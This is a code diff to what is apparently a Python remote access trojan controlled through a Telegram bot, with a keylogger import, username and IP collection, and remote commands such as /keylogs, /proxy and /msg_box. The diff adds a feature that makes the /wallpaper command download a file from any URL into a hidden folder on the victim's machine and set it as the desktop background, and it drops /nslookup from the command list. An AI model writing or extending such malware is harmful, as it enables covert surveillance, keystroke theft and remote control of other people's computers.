@@ -23,6 +23,7 @@ import pyHook, pythoncom 								# keylogger
 import socket											# internal IP
 import getpass											# get username
 import collections
+import urllib											# wallpaper	
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
 #token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
@@ -500,6 +501,11 @@ def handle(msg):
 				command = command.strip()
 				if len(command) == 0:
 					response = 'Usage: /wallpaper C:/Users/User/Desktop/porn.jpg'
+				elif command.startswith('http'):
+					image = command.rsplit('/',1)[1]
+					image = hide_folder + '/' + image
+					urllib.urlretrieve(command, image)
+					ctypes.windll.user32.SystemParametersInfoW(20, 0, image, 3)
 				else:
 					ctypes.windll.user32.SystemParametersInfoW(20, 0, command.replace('/', '//'), 3)
 					response = 'Wallpaper succesfully set.'
@@ -520,7 +526,6 @@ def handle(msg):
 						'/keylogs':'', \
 						'/ls':'[target_folder]', \
 						'/msg_box':'<text>', \
-						'/nslookup':'', \
 						'/pc_info':'', \
 						'/play':'<youtube_videoId>', \
 						'/proxy':'', \
